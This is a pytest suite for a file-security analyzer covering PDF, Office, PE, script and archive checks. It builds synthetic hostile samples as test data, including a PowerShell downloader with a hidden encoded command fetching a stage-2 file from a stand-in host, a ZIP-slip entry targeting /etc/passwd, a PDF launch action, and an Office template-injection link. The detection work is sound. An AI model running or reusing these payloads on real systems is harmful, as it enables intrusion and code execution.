"""
Test suite for Section 8: Attachment & File Security Analyzer.
Verifies all 34 required test scenarios, 10 security tests, 9 false-positive mitigations,
and the full end-to-end integration demo (Email -> ZIP -> PDF -> URL).
"""
from typing import Dict
import asyncio
import io
import json
import os
import struct
import zipfile
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from backend.main import app
from backend.db.session import get_db, SessionLocal
from backend.db.models import (
    ArtifactModel,
    AnalysisRunModel,
    FindingModel,
    FindingEvidenceModel,
    IndicatorModel,
    RelationshipModel,
    ThreatEventModel,
)
from backend.schemas.unified import (
    ArtifactTypeEnum,
    AnalysisStatusEnum,
    IndicatorTypeEnum,
    RelationshipTypeEnum,
    SeverityEnum,
)
from backend.services.file_security_analyzers import (
    FileIdentityAnalyzer,
    FilenameSecurityAnalyzer,
    DocumentStaticAnalyzer,
    ExecutableStaticAnalyzer,
    ScriptStaticAnalyzer,
    ArchiveSecurityAnalyzer,
    FileIOCAnalyzer,
    FileReputationAnalyzer,
    FileClassificationService,
)
from backend.services.file_security_pipeline import FileSecurityPipeline
from backend.schemas.file_security import ThreatIntelHashInfo
from backend.services.threat_intelligence_service import ThreatIntelligenceService, ThreatIntelResult
from backend.services.evidence_storage import evidence_storage


client = TestClient(app)


@pytest.fixture
def db_session():
    """Provides a transactional database session for tests."""
    session = SessionLocal()
    try:
        yield session
    finally:
        session.close()


# ============================================================================
# SYNTHETIC FIXTURE GENERATORS
# ============================================================================

def make_synthetic_pe(is_signed: bool = False, packer_name: str = ".text", entropy_pad: bool = False) -> bytes:
    """Generates safe synthetic PE header bytes for static testing without executable code."""
    # MZ header (64 bytes total: "MZ" + 62 nulls)
    mz = bytearray(b"MZ" + b"\x00" * 62)
    e_lfanew = 0x80
    struct.pack_into("<I", mz, 0x3C, e_lfanew)
    
    # Pad to e_lfanew
    pe_data = bytearray(mz)
    if len(pe_data) < e_lfanew:
        pe_data.extend(b"\x00" * (e_lfanew - len(pe_data)))
        
    # PE signature
    pe_data.extend(b"PE\x00\x00")
    
    # COFF File Header (20 bytes)
    # machine: x64 (0x8664), num_sections: 1, timedatestamp: 1672531199 (2022-12-31), opt_hdr_size: 240
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 1672531199, 0, 0, 240, 0x0002)
    pe_data.extend(coff)
    
    # Optional Header (PE32+ / 64-bit, magic 0x020B)
    opt = bytearray(240)
    struct.pack_into("<H", opt, 0, 0x020B)  # 64-bit magic
    struct.pack_into("<I", opt, 16, 0x1000) # EntryPoint RVA
    struct.pack_into("<H", opt, 68, 2)      # Subsystem: Windows GUI
    
    # Security Directory (Directory 4: offset = 112 + 4 * 8 = 144)
    if is_signed:
        struct.pack_into("<II", opt, 144, 0x5000, 0x200) # RVA 0x5000, Size 0x200
    else:
        struct.pack_into("<II", opt, 144, 0, 0)
        
    pe_data.extend(opt)
    
    # Section Header (40 bytes)
    sec_name = packer_name.encode("latin-1")[:8].ljust(8, b"\x00")
    raw_ptr = len(pe_data) + 40
    raw_size = 16384 if entropy_pad else 512
    # Characteristics: IMAGE_SCN_MEM_EXECUTE (0x20000000) | IMAGE_SCN_MEM_READ (0x40000000)
    sec_chars = 0x60000020
    sec = struct.pack("<8sIIIIIIHHI", sec_name, 0x1000, 0x1000, raw_size, raw_ptr, 0, 0, 0, 0, sec_chars)
    pe_data.extend(sec)
    
    # Section bytes
    if entropy_pad:
        pe_data.extend(os.urandom(raw_size))
    else:
        pe_data.extend(b"A" * raw_size)
        
    # Append imported DLL strings safely for inspection
    pe_data.extend(b"\x00KERNEL32.dll\x00VirtualAlloc\x00CreateRemoteThread\x00URLDownloadToFileA\x00")
    
    return bytes(pe_data)


def make_synthetic_pdf(
    with_js: bool = False,
    with_open_action: bool = False,
    with_launch: bool = False,
    with_url: bool = False,
    is_encrypted: bool = False,
) -> bytes:
    """Generates safe synthetic PDF structural marker fixtures."""
    lines = [b"%PDF-1.7", b"1 0 obj", b"<< /Type /Catalog"]
    if with_open_action:
        lines.append(b"/OpenAction 3 0 R")
    lines.append(b"/Pages 2 0 R >>")
    lines.append(b"endobj")
    
    lines.append(b"2 0 obj")
    dict_parts = [b"<< /Type /Pages /Kids [] /Count 0"]
    if with_js:
        dict_parts.append(b"/JavaScript (app.alert('Harmless synthetic test alert');)")
    if with_launch:
        dict_parts.append(b"/Launch << /F (calc.exe) >>")
    if with_url:
        dict_parts.append(b"/URI (https://login-example.test/secure/verify)")
    if is_encrypted:
        dict_parts.append(b"/Encrypt << /V 2 /R 3 >>")
    dict_parts.append(b">>")
    lines.append(b" ".join(dict_parts))
    lines.append(b"endobj")
    
    lines.append(b"xref")
    lines.append(b"0 3")
    lines.append(b"0000000000 65535 f ")
    lines.append(b"0000000009 00000 n ")
    lines.append(b"0000000074 00000 n ")
    lines.append(b"trailer << /Size 3 /Root 1 0 R >>")
    lines.append(b"startxref")
    lines.append(b"200")
    lines.append(b"%%EOF")
    return b"\n".join(lines)


def make_synthetic_office(is_docm: bool = False, has_external_rel: bool = False) -> bytes:
    """Generates safe synthetic Office OpenXML DOCX / DOCM bytes."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>')
        zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Quarterly Report</w:t></w:r></w:p></w:body></w:document>")
        zf.writestr("docProps/core.xml", '<?xml version="1.0"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>Financial Report</dc:title><dc:creator>Alice Finance</dc:creator></cp:coreProperties>')
        
        if is_docm:
            zf.writestr("word/vbaProject.bin", b"VBA_DUMMY_BINARY\x00AutoOpen\x00Shell\x00WScript.Shell\x00")
            
        if has_external_rel:
            zf.writestr(
                "word/_rels/document.xml.rels",
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
                '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="https://template-injection.test/payload.dotm" TargetMode="External"/>\n'
                '</Relationships>'
            )
    return buf.getvalue()


def make_synthetic_zip(
    files: Dict[str, bytes],
    is_encrypted: bool = False,
    comment: bytes = b"",
) -> bytes:
    """Generates in-memory ZIP archives with precise entries."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        if comment:
            zf.comment = comment
        for fname, content in files.items():
            zf.writestr(fname, content)
            
    data = bytearray(buf.getvalue())
    if is_encrypted:
        loc = data.find(b"PK\x03\x04")
        if loc != -1:
            data[loc + 6] |= 1
        cd = data.find(b"PK\x01\x02")
        if cd != -1:
            data[cd + 8] |= 1
    return bytes(data)


# ============================================================================
# 1. FILE IDENTITY & HASH TESTS
# ============================================================================

def test_01_sha256_hashing():
    """Test 1: Streaming SHA-256 calculation."""
    content = b"CyberGuard Static File Security Test Payload 12345"
    import hashlib
    expected = hashlib.sha256(content).hexdigest()
    
    sha256, sha1, md5 = FileIdentityAnalyzer.calculate_streaming_hashes(content)
    assert sha256 == expected
    assert len(sha256) == 64


def test_02_sha1_hashing():
    """Test 2: SHA-1 calculation for legacy threat intel interoperability."""
    content = b"CyberGuard Static File Security Test Payload 12345"
    import hashlib
    expected = hashlib.sha1(content).hexdigest()
    
    sha256, sha1, md5 = FileIdentityAnalyzer.calculate_streaming_hashes(content)
    assert sha1 == expected
    assert len(sha1) == 40


def test_03_md5_hashing():
    """Test 3: MD5 calculation for legacy IOC matching."""
    content = b"CyberGuard Static File Security Test Payload 12345"
    import hashlib
    expected = hashlib.md5(content).hexdigest()
    
    sha256, sha1, md5 = FileIdentityAnalyzer.calculate_streaming_hashes(content)
    assert md5 == expected
    assert len(md5) == 32


def test_04_file_size_detection():
    """Test 4: Accurate file byte size recording."""
    analyzer = FileIdentityAnalyzer()
    payload = b"X" * 4096
    res, identity = analyzer.analyze(payload, filename="sample.bin")
    assert identity.size_bytes == 4096


def test_05_original_filename_preservation():
    """Test 5: Original filename preservation and safe display name."""
    analyzer = FileIdentityAnalyzer()
    raw_name = "Quarterly_Financial_Report_2026.pdf"
    res, identity = analyzer.analyze(b"%PDF-1.7\n%EOF", filename=raw_name)
    assert identity.original_filename == raw_name
    assert identity.safe_display_name == raw_name


def test_06_mime_detection():
    """Test 6: Deep magic bytes MIME detection."""
    pdf_bytes = make_synthetic_pdf()
    detected_type, mime, claimed, is_poly = FileIdentityAnalyzer.detect_file_type(pdf_bytes, "document.pdf")
    assert "PDF" in detected_type
    assert mime == "application/pdf"


def test_07_extension_mime_mismatch():
    """Test 7: FILE_TYPE_MISMATCH created when document extension disguises executable."""
    pe_bytes = make_synthetic_pe()
    analyzer = FileIdentityAnalyzer()
    res, identity = analyzer.analyze(pe_bytes, filename="invoice.pdf", reported_mime="application/pdf")
    
    assert identity.detected_file_type == "Windows executable"
    mismatch_findings = [f for f in res.findings if f["finding_type"] == "FILE_TYPE_MISMATCH"]
    assert len(mismatch_findings) == 1
    assert mismatch_findings[0]["severity"] == SeverityEnum.HIGH


def test_08_double_extension_detection():
    """Test 8: DOUBLE_EXTENSION detected when executable hides behind document extension."""
    fn_analyzer = FilenameSecurityAnalyzer()
    res, fn_info = fn_analyzer.analyze("urgent_invoice.pdf.exe")
    assert fn_info.is_double_extension is True
    double_findings = [f for f in res.findings if f["finding_type"] == "DOUBLE_EXTENSION"]
    assert len(double_findings) == 1
    assert double_findings[0]["severity"] == SeverityEnum.HIGH


def test_09_unicode_filename_deception():
    """Test 9: Right-to-Left Override (\u202e) detected, legitimate non-ASCII preserved."""
    fn_analyzer = FilenameSecurityAnalyzer()
    
    # Hostile RLO filename: invoice[RLO]cod.exe
    rlo_name = "invoice\u202ecod.exe"
    res_rlo, fn_rlo = fn_analyzer.analyze(rlo_name)
    assert fn_rlo.has_unicode_deception is True
    assert any("U+202E" in c for c in fn_rlo.detected_control_characters)
    assert len([f for f in res_rlo.findings if f["finding_type"] == "UNICODE_FILENAME_DECEPTION"]) == 1
    
    # Benign international filename (French accent): résumé_café.pdf
    res_clean, fn_clean = fn_analyzer.analyze("résumé_café.pdf")
    assert fn_clean.has_unicode_deception is False
    assert len(res_clean.findings) == 0


# ============================================================================
# 2. DOCUMENT STATIC ANALYSIS (PDF & OFFICE)
# ============================================================================

def test_10_safe_pdf_parsing():
    """Test 10: Safe PDF parsing without code execution."""
    pdf_bytes = make_synthetic_pdf(with_open_action=True)
    res, pdf_meta = DocumentStaticAnalyzer.parse_pdf(pdf_bytes)
    assert pdf_meta.is_pdf is True
    assert pdf_meta.has_open_action is True
    assert any(f["finding_type"] == "PDF_OPEN_ACTION_PRESENT" for f in res.findings)


def test_11_pdf_url_extraction():
    """Test 11: PDF /URI hyperlinks safely discovered and added to indicators."""
    pdf_bytes = make_synthetic_pdf(with_url=True)
    res, pdf_meta = DocumentStaticAnalyzer.parse_pdf(pdf_bytes)
    assert pdf_meta.has_external_uri is True
    assert "https://login-example.test/secure/verify" in pdf_meta.external_uris
    assert any(ind["value"] == "https://login-example.test/secure/verify" for ind in res.indicators)


def test_12_pdf_javascript_detection():
    """Test 12: PDF_JAVASCRIPT_PRESENT detected with snippet, without executing JS."""
    pdf_bytes = make_synthetic_pdf(with_js=True)
    res, pdf_meta = DocumentStaticAnalyzer.parse_pdf(pdf_bytes)
    assert pdf_meta.has_javascript is True
    assert len(pdf_meta.javascript_snippets) > 0
    js_findings = [f for f in res.findings if f["finding_type"] == "PDF_JAVASCRIPT_PRESENT"]
    assert len(js_findings) == 1
    assert js_findings[0]["severity"] == SeverityEnum.MEDIUM


def test_13_office_metadata():
    """Test 13: Office metadata extracted from docProps/core.xml."""
    docx_bytes = make_synthetic_office(is_docm=False)
    res, office_meta = DocumentStaticAnalyzer.parse_office(docx_bytes, "Microsoft Word OpenXML (DOCX)")
    assert office_meta.is_office is True
    assert office_meta.metadata.get("creator") == "Alice Finance"
    assert office_meta.metadata.get("title") == "Financial Report"


def test_14_macro_presence_detection():
    """Test 14: MACRO_PRESENT detected with static keywords, not claiming malware confirmed."""
    docm_bytes = make_synthetic_office(is_docm=True, has_external_rel=True)
    res, office_meta = DocumentStaticAnalyzer.parse_office(docm_bytes, "Word Macro-enabled document (DOCM)")
    assert office_meta.has_macros is True
    assert "AutoOpen" in office_meta.suspicious_keywords
    assert office_meta.has_external_relationships is True
    
    macro_findings = [f for f in res.findings if f["finding_type"] == "MACRO_PRESENT"]
    assert len(macro_findings) == 1
    assert "MACRO_PRESENT" in macro_findings[0]["description"]


# ============================================================================
# 3. SCRIPT & EXECUTABLE STATIC ANALYSIS
# ============================================================================

def test_15_script_static_analysis():
    """Test 15: Pure static text analysis for PowerShell script with encoded command and downloader."""
    script_content = (
        "# PowerShell deploy script\n"
        "$url = 'https://malicious-test.test/stage2.bin'\n"
        "(New-Object Net.WebClient).DownloadString($url)\n"
        "powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==\n"
        "iex $payload\n"
    )
    analyzer = ScriptStaticAnalyzer()
    res, script_meta = analyzer.analyze(script_content, script_type="PowerShell Script")
    assert script_meta.has_encoded_commands is True
    assert script_meta.has_download_commands is True
    assert script_meta.has_execution_chains is True
    assert len(res.findings) >= 2


def test_16_entropy_calculation():
    """Test 16: Shannon entropy calculation and HIGH_ENTROPY_CONTENT evaluation."""
    pe_high_entropy = make_synthetic_pe(entropy_pad=True)
    analyzer = ExecutableStaticAnalyzer()
    res, pe_meta, entropy_eval = analyzer.analyze(pe_high_entropy)
    assert entropy_eval.entropy > 7.0
    assert entropy_eval.is_high_entropy is True
    assert any(f["finding_type"] == "HIGH_ENTROPY_CONTENT" for f in res.findings)


# ============================================================================
# 4. ARCHIVE SECURITY & ZIP-SLIP DEFENSE
# ============================================================================

def test_17_zip_listing():
    """Test 17: Safe ZIP archive listing without disk extraction."""
    zip_bytes = make_synthetic_zip({
        "readme.txt": b"Hello world",
        "data/report.pdf": b"%PDF-1.7...",
    })
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(zip_bytes)
    assert arch_meta.total_files == 2
    assert len(arch_meta.entries) == 2


def test_18_zip_extraction():
    """Test 18: In-memory extraction of safe child entries."""
    pdf_content = b"%PDF-1.7\nSample content\n%%EOF"
    zip_bytes = make_synthetic_zip({"invoice.pdf": pdf_content})
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(zip_bytes)
    assert len(child_entries) == 1
    assert child_entries[0]["filename"] == "invoice.pdf"
    assert child_entries[0]["bytes"] == pdf_content


def test_19_zip_slip_blocking():
    """Test 19: Zip-Slip path traversal (../../etc/passwd) rejected and flagged as CRITICAL."""
    slip_bytes = make_synthetic_zip({
        "../../../../etc/passwd": b"root:x:0:0:root:/root:/bin/bash\n",
        "legit.txt": b"safe content",
    })
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(slip_bytes)
    assert arch_meta.has_path_traversal is True
    slip_findings = [f for f in res.findings if f["finding_type"] == "PATH_TRAVERSAL_DETECTED"]
    assert len(slip_findings) == 1
    assert slip_findings[0]["severity"] == SeverityEnum.CRITICAL
    assert not any("../" in c.get("original_entry_path", "") for c in child_entries)


def test_20_zip_bomb_limit():
    """Test 20: Zip bomb protection against oversized aggregate expansion or high ratio."""
    bomb_bytes = make_synthetic_zip({"large.bin": b"\x00" * (60 * 1024 * 1024)})
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(bomb_bytes)
    bomb_findings = [f for f in res.findings if f["finding_type"] == "ARCHIVE_EXTRACTION_LIMIT_REACHED"]
    assert len(bomb_findings) >= 1
    assert bomb_findings[0]["severity"] == SeverityEnum.HIGH


def test_21_nested_archive_detection():
    """Test 21: Nested archive detection."""
    inner_zip = make_synthetic_zip({"inner.txt": b"hello"})
    outer_zip = make_synthetic_zip({"nested.zip": inner_zip})
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(outer_zip)
    assert arch_meta.has_nested_archives is True


def test_22_password_protected_archive():
    """Test 22: Password-protected archive detection (ARCHIVE_ENCRYPTED)."""
    enc_zip = make_synthetic_zip({"secret.txt": b"secret data"}, is_encrypted=True)
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(enc_zip)
    assert arch_meta.is_encrypted is True
    enc_findings = [f for f in res.findings if f["finding_type"] == "ARCHIVE_ENCRYPTED"]
    assert len(enc_findings) == 1


# ============================================================================
# 5. DERIVED ARTIFACTS & RELATIONSHIPS
# ============================================================================

def test_23_derived_artifact_creation(db_session: Session):
    """Test 23: Child entries extracted from an archive create derived Artifact records."""
    pdf_payload = make_synthetic_pdf(with_url=True)
    zip_bytes = make_synthetic_zip({"invoice.pdf": pdf_payload})
    
    pipeline = FileSecurityPipeline()
    response = asyncio.run(pipeline.analyze_file(
        payload_bytes=zip_bytes,
        filename="bundle.zip",
        db=db_session,
    ))
    assert len(response.derived_artifacts) == 1
    child = response.derived_artifacts[0]
    assert child.name == "invoice.pdf"
    assert child.relationship_type == "CONTAINS"
    
    db_child = db_session.query(ArtifactModel).filter(ArtifactModel.id == child.artifact_id).first()
    assert db_child is not None
    assert db_child.parent_artifact_id == response.artifact_id


def test_24_parent_child_relationships(db_session: Session):
    """Test 24: Security Knowledge Graph edge ARCHIVE CONTAINS CHILD."""
    pdf_payload = make_synthetic_pdf()
    zip_bytes = make_synthetic_zip({"sample.pdf": pdf_payload})
    
    pipeline = FileSecurityPipeline()
    resp = asyncio.run(pipeline.analyze_file(payload_bytes=zip_bytes, filename="archive.zip", db=db_session))
    
    rel = db_session.query(RelationshipModel).filter(
        RelationshipModel.source_id == resp.artifact_id,
        RelationshipModel.relationship_type == RelationshipTypeEnum.CONTAINS.value,
    ).first()
    assert rel is not None


# ============================================================================
# 6. IOC EXTRACTION & ROUTING
# ============================================================================

def test_25_ioc_extraction():
    """Test 25: Bounded extraction of printable strings (URLs, IPs, emails)."""
    payload = (
        b"Arbitrary binary content \x00\x01\x02 "
        b"Contact us at security@cyberguard.test or visit https://portal.cyberguard.test/login. "
        b"C2 Server observed at 198.51.100.44."
    )
    analyzer = FileIOCAnalyzer()
    res, iocs = analyzer.analyze(payload)
    assert "https://portal.cyberguard.test/login" in iocs["urls"]
    assert "198.51.100.44" in iocs["ips"]
    assert "security@cyberguard.test" in iocs["emails"]
    assert any(f["finding_type"] == "EXTERNAL_URL_EMBEDDED" for f in res.findings)


# ============================================================================
# 7. THREAT INTELLIGENCE & REPUTATION
# ============================================================================

def test_27_hash_reputation_lookup(monkeypatch):
    """Test 27: Threat intelligence hash lookup matching known malicious hash."""
    malicious_sha256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    from backend.services.threat_intel_providers import CyberGuardLocalFeedProvider
    monkeypatch.setattr(CyberGuardLocalFeedProvider, "KNOWN_MALICIOUS_HASHES", {malicious_sha256: {"category": "Test malware indicator", "confidence": 0.95}})
    
    ti_service = ThreatIntelligenceService()
    analyzer = FileReputationAnalyzer(ti_service)
    res, hash_info = asyncio.run(analyzer.analyze(sha256=malicious_sha256))
    
    assert hash_info.is_malicious is True
    assert hash_info.verdict == "MALICIOUS"
    assert any(f["finding_type"] == "THREAT_INTELLIGENCE_HASH_MATCH" for f in res.findings)



def test_28_provider_unavailable():
    """Test 28: Provider rate-limited or unavailable returns rate limit status without error."""
    ti_service = ThreatIntelligenceService(rate_limit_simulated=True)
    analyzer = FileReputationAnalyzer(ti_service)
    res, hash_info = asyncio.run(analyzer.analyze(sha256="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"))
    assert hash_info.verdict == "RATE_LIMITED"
    assert hash_info.is_malicious is False


def test_29_no_match_not_equal_safe():
    """Test 29: MANDATORY RULE: NO MATCH != SAFE. Unmatched hashes return UNKNOWN."""
    ti_service = ThreatIntelligenceService()
    analyzer = FileReputationAnalyzer(ti_service)
    clean_sha256 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
    res, hash_info = asyncio.run(analyzer.analyze(sha256=clean_sha256))
    
    assert hash_info.is_malicious is False
    assert hash_info.verdict == "UNKNOWN"
    assert "No Match != Safe" in (hash_info.details or "")


# ============================================================================
# 8. PARSER FAILURE ISOLATION & RESOURCE LIMITS
# ============================================================================

def test_30_parser_failure_isolation():
    """Test 30: Corrupted / malformed files do not crash the engine."""
    malformed_pe = b"MZ\x00\x00\x00\x00Malformed"
    analyzer = ExecutableStaticAnalyzer()
    res, pe_meta, ent = analyzer.analyze(malformed_pe)
    assert pe_meta.is_pe is False
    assert len(pe_meta.warnings) > 0
    
    malformed_pdf = b"%PDF-corrupted-stream-garbage\xff\xfe\x00"
    res_pdf, pdf_meta = DocumentStaticAnalyzer.parse_pdf(malformed_pdf)
    assert pdf_meta.is_pdf is True


def test_31_file_size_limit(db_session: Session):
    """Test 31: Enforces maximum input file size ceiling."""
    pipeline = FileSecurityPipeline()
    pipeline.MAX_FILE_SIZE = 1000
    with pytest.raises(ValueError, match="exceeds maximum file limit"):
        asyncio.run(pipeline.analyze_file(
            payload_bytes=b"X" * 2000,
            filename="oversized.bin",
            db=db_session,
        ))


def test_32_reanalysis_creates_new_run(db_session: Session):
    """Test 32: Re-analyzing an existing artifact creates a new AnalysisRun without overwriting history."""
    pdf_bytes = make_synthetic_pdf()
    pipeline = FileSecurityPipeline()
    
    res1 = asyncio.run(pipeline.analyze_file(payload_bytes=pdf_bytes, filename="test.pdf", db=db_session))
    run_id_1 = res1.analysis_run_id
    
    res2 = asyncio.run(pipeline.reanalyze_artifact(artifact_id=res1.artifact_id, db=db_session))
    run_id_2 = res2.analysis_run_id
    
    assert run_id_1 != run_id_2
    runs = db_session.query(AnalysisRunModel).filter(AnalysisRunModel.artifact_id == res1.artifact_id).all()
    assert len(runs) == 2


# ============================================================================
# 9. INTEGRATION & FALSE-POSITIVE TESTS
# ============================================================================

def test_38_false_positive_mitigations():
    """Test 38: Verify signals are not treated as confirmed malware on their own."""
    unsigned_pe = make_synthetic_pe(is_signed=False)
    res_exe, pe_meta, ent = ExecutableStaticAnalyzer().analyze(unsigned_pe)
    hash_clean = ThreatIntelHashInfo(
        provider="test", sha256_queried="123", verdict="UNKNOWN", is_malicious=False,
        confidence=0.0, retrieved_at="now"
    )
    cls_pe, score, sev, _, _ = FileClassificationService.classify(res_exe.findings, hash_clean, "Windows executable")
    assert cls_pe != "KNOWN_MALICIOUS"
    
    macro_findings = [{"finding_type": "MACRO_PRESENT", "severity": SeverityEnum.MEDIUM}]
    cls_macro, score_macro, sev_macro, _, _ = FileClassificationService.classify(macro_findings, hash_clean, "Word Macro-enabled document (DOCM)")
    assert cls_macro == "SUSPICIOUS"
    assert sev_macro == SeverityEnum.MEDIUM
    
    url_findings = [{"finding_type": "PDF_EXTERNAL_URL", "severity": SeverityEnum.LOW}]
    cls_url, score_url, sev_url, _, _ = FileClassificationService.classify(url_findings, hash_clean, "PDF document")
    assert cls_url == "UNVERIFIED"
    assert score_url == 0.0


def test_39_full_pipeline_synthetic_integration_demo(db_session: Session):
    """
    Test 39: Integration Demo.
    Synthetic scenario:
    archive.zip
       │
       ▼
    invoice.pdf
       │
       ▼
    https://login-example.test/
    
    Verifies that CyberGuard safely parses archive, extracts child PDF,
    discovers embedded URL, and records knowledge graph relationships:
    ARCHIVE CONTAINS PDF, PDF REFERENCES URL.
    """
    pdf_payload = make_synthetic_pdf(with_url=True)
    zip_bytes = make_synthetic_zip({"invoice.pdf": pdf_payload})
    
    pipeline = FileSecurityPipeline()
    response = asyncio.run(pipeline.analyze_file(
        payload_bytes=zip_bytes,
        filename="invoice.zip",
        db=db_session,
    ))
    
    assert response.classification == "UNVERIFIED"
    assert response.risk_score == 0.0
    assert response.confidence == 0.0
    assert len(response.derived_artifacts) == 1
    child = response.derived_artifacts[0]
    assert child.name == "invoice.pdf"
    
    child_resp = asyncio.run(pipeline.reanalyze_artifact(artifact_id=child.artifact_id, db=db_session))
    assert "https://login-example.test/secure/verify" in child_resp.extracted_urls
    
    contains_rel = db_session.query(RelationshipModel).filter(
        RelationshipModel.source_id == response.artifact_id,
        RelationshipModel.target_id == child.artifact_id,
        RelationshipModel.relationship_type == RelationshipTypeEnum.CONTAINS.value,
    ).first()
    assert contains_rel is not None
    
    ref_rel = db_session.query(RelationshipModel).filter(
        RelationshipModel.source_id == child.artifact_id,
        RelationshipModel.relationship_type == RelationshipTypeEnum.REFERENCES.value,
    ).first()
    assert ref_rel is not None


# ============================================================================
# 10. API ENDPOINT TESTS
# ============================================================================

def test_api_analyze_file_endpoint():
    """Test POST /api/files/analyze multipart upload."""
    pdf_bytes = make_synthetic_pdf(with_url=True)
    resp = client.post(
        "/api/files/analyze",
        files={"file": ("invoice.pdf", pdf_bytes, "application/pdf")},
        data={"uploader": "SECURITY_ANALYST"},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["identity"]["detected_file_type"] == "PDF document"
    assert "https://login-example.test/secure/verify" in data["extracted_urls"]
    assert data["status"] == "COMPLETED"


def test_api_config_endpoint():
    """Test GET /api/files/config returns limits and capability matrix."""
    resp = client.get("/api/files/config")
    assert resp.status_code == 200
    data = resp.json()
    assert data["max_file_size_bytes"] == 50 * 1024 * 1024
    assert "PDF" in data["supported_formats"]
    assert "PE/EXE" in data["supported_formats"]
    assert data["supported_formats"]["PDF"]["static_analysis"] is True


# ============================================================================
# 11. ROUTING, REPORTS & ADDITIONAL SECURITY TESTS
# ============================================================================

def test_26_url_routing_to_section7(db_session: Session):
    """Test 26: Discovered URL routed into Section 7 URL Intelligence."""
    from backend.services.url_domain_pipeline import URLDomainIntelligencePipeline
    url_pipe = URLDomainIntelligencePipeline()
    test_url = "https://login-example.test/secure/verify"
    
    url_resp = asyncio.run(url_pipe.analyze_url(
        url=test_url,
        db=db_session,
        active_analysis_enabled=False,
    ))
    assert url_resp["target"] == test_url
    assert "findings" in url_resp
    assert url_resp["status"] == "COMPLETED"


def test_33_existing_eml_attachment_flow(db_session: Session):
    """Test 33: Existing EML attachment flow is preserved and operates safely."""
    from backend.services.email_intelligence_pipeline import EmailIntelligencePipeline
    
    eml_raw = (
        b"From: sender@bank.test\r\n"
        b"To: victim@example.com\r\n"
        b"Subject: Statement with Attachment\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="BOUNDARY123"\r\n\r\n'
        b"--BOUNDARY123\r\n"
        b"Content-Type: text/plain\r\n\r\n"
        b"Please see attached invoice.\r\n\r\n"
        b"--BOUNDARY123\r\n"
        b'Content-Type: application/pdf; name="invoice.pdf"\r\n'
        b"Content-Transfer-Encoding: base64\r\n\r\n"
        b"JVBERi0xLjcKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZz4+ZW5kb2JqCg==\r\n"
        b"--BOUNDARY123--\r\n"
    )
    
    resp, analysis_run = asyncio.run(EmailIntelligencePipeline.analyze_email_bytes(
        db=db_session,
        content_bytes=eml_raw,
        filename="test_att.eml",
    ))
    assert resp is not None
    assert resp.threat_score is not None


def test_34_existing_reports_compatibility():
    """Test 34: Existing report generation remains compatible."""
    from backend.services.report_service import ReportService
    minimal_analysis = {
        "subject": "Minimal Notification",
        "from": "notifier@minimal.local"
    }
    pdf_bytes = ReportService.generate_email_report(minimal_analysis)
    assert isinstance(pdf_bytes, bytes)
    assert pdf_bytes.startswith(b"%PDF-")


def test_security_absolute_archive_paths():
    """Security Test: Absolute archive paths (/etc/shadow, C:\\windows\\system32) blocked."""
    assert ArchiveSecurityAnalyzer.is_safe_path("/etc/shadow") is False
    assert ArchiveSecurityAnalyzer.is_safe_path("\\Windows\\System32\\cmd.exe") is False
    assert ArchiveSecurityAnalyzer.is_safe_path("C:\\Windows\\System32\\cmd.exe") is False
    assert ArchiveSecurityAnalyzer.is_safe_path("D:/payload.exe") is False
    assert ArchiveSecurityAnalyzer.is_safe_path("legit/sub/folder/file.pdf") is True


def test_security_malformed_office():
    """Security Test: Corrupted Office container fails safely without crashing."""
    corrupted_office = b"PK\x03\x04corrupted_header_data_not_valid_zip"
    res, meta = DocumentStaticAnalyzer.parse_office(corrupted_office, "Microsoft Word OpenXML (DOCX)")
    assert meta.is_office is True
    assert meta.has_macros is False


def test_security_excessive_archive_entries():
    """Security Test: Archive containing excessive entries hits safety ceiling."""
    files = {f"file_{i}.txt": b"content" for i in range(260)}
    zip_bytes = make_synthetic_zip(files)
    analyzer = ArchiveSecurityAnalyzer()
    res, arch_meta, child_entries = analyzer.analyze_zip(zip_bytes)
    assert any(f["finding_type"] == "ARCHIVE_EXTRACTION_LIMIT_REACHED" for f in res.findings)
